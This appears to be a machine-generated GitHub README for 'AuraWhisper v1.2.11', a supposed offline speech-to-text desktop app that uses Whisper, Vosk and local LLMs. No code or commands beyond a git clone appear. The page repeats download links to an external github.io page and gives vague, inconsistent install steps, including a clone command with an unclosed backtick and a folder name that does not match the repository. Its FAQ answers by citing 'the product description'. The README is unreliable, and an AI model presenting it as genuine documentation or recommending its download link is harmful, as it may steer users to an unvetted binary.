# AuraWhisper v1.2.11 - local AI transcription tool 2026

> **Offline speech-to-text with local AI-assisted refinement for desktop workflows, built for privacy-minded voice input and proofreading in version 1.2.11.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.11-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaac-walkerjf1664/aurawhisper-version-1-2-11?style=flat-square)](https://github.com/isaac-walkerjf1664/aurawhisper-version-1-2-11)

---

<p align="center">
  <a href="https://isaac-walkerjf1664.github.io/aurawhisper-version-1-2-11/">
    <img src="https://img.shields.io/badge/Download-AuraWhisper%20Latest-brightgreen?style=for-the-badge" alt="Download AuraWhisper">
  </a>
</p>

> **[Direct Download - AuraWhisper v1.2.11](https://isaac-walkerjf1664.github.io/aurawhisper-version-1-2-11/)**

---

[Download Latest Build](https://isaac-walkerjf1664.github.io/aurawhisper-version-1-2-11/)

---

## Overview

AuraWhisper is a desktop-focused transcription app that keeps processing on your machine instead of sending audio to cloud services. It pairs speech-to-text capture with local AI-based cleanup so you can move from spoken input to refined text without leaving the app.

The workflow is a good fit for note taking, drafting, documentation, and other voice-driven editing tasks where offline operation matters. With support for Whisper, Vosk, and local LLM connections through Ollama or LM Studio, AuraWhisper can be used in several on-device transcription and polishing setups.

---

## Capabilities

- Keeps transcription processing fully local and offline
- Shows a live transcription preview as you speak
- Uses AI to refine text for proofreading and cleanup
- Includes global hotkey support for quicker control
- Supports speech-to-text with Whisper
- Provides on-device live STT through Vosk
- Connects to local LLMs via Ollama or LM Studio
- Ships with an Electron desktop UI for an app-like experience

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/isaac-walkerjf1664/aurawhisper-version-1-2-11.git
2. Open the project folder:
   - `cd AuraWhisper`
3. Install the app dependencies according to your desktop runtime setup.
4. Launch the application from the Electron entry point used by your build.

If you are using a packaged release, download the latest build and run the desktop app directly from your system.

---

## Usage

Open AuraWhisper, pick the transcription mode you want, and start speaking into your microphone. The app can display a live preview of recognized speech so you can follow along while it is being captured.

To refine text, connect a local LLM provider such as Ollama or LM Studio and pass the transcript through the proofreading flow. Global hotkeys make it easier to trigger actions while you work, which helps when switching between recording, reviewing, and editing.

Typical workflow:

1. Open AuraWhisper
2. Select Whisper or Vosk for transcription
3. Start voice input
4. Review the live transcript
5. Apply local AI refinement if needed
6. Copy or reuse the finalized text in your notes or editor

---

## Configuration

All configuration is managed in the desktop app and varies based on the transcription engine or local model provider you select.

Common settings include:
- Microphone and input selection
- Whisper or Vosk mode selection
- Local LLM provider setup for Ollama or LM Studio
- Hotkey preferences
- Transcription and refinement behavior

If your build stores settings in a local configuration file, keep it alongside the application data used by the Electron app.

---

## Requirements

- Desktop environment
- Electron-based runtime/application build
- Local audio input for speech capture
- Enough storage for app files and any local models you choose to use
- Compatible local components for:
  - Whisper transcription
  - Vosk live STT
  - Ollama or LM Studio for local LLM features

---

## FAQ

**Can AuraWhisper run without an internet connection?**  
Yes. The product description specifies fully local offline processing.

**Which transcription engines are available?**  
The listed features include Whisper and Vosk.

**Is local language-model integration supported?**  
Yes. AuraWhisper works with Ollama or LM Studio for local LLM use.

**Where should I adjust preferences?**  
Use the desktop app's configuration options, or the local app data files if your build keeps preferences there.

**What should I check if transcription does not begin?**  
Verify microphone access, confirm the selected speech engine, and make sure the required local services or models are available.

**How do I get the latest version?**  
Use the latest build link above and check repository releases or published build artifacts when they are available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
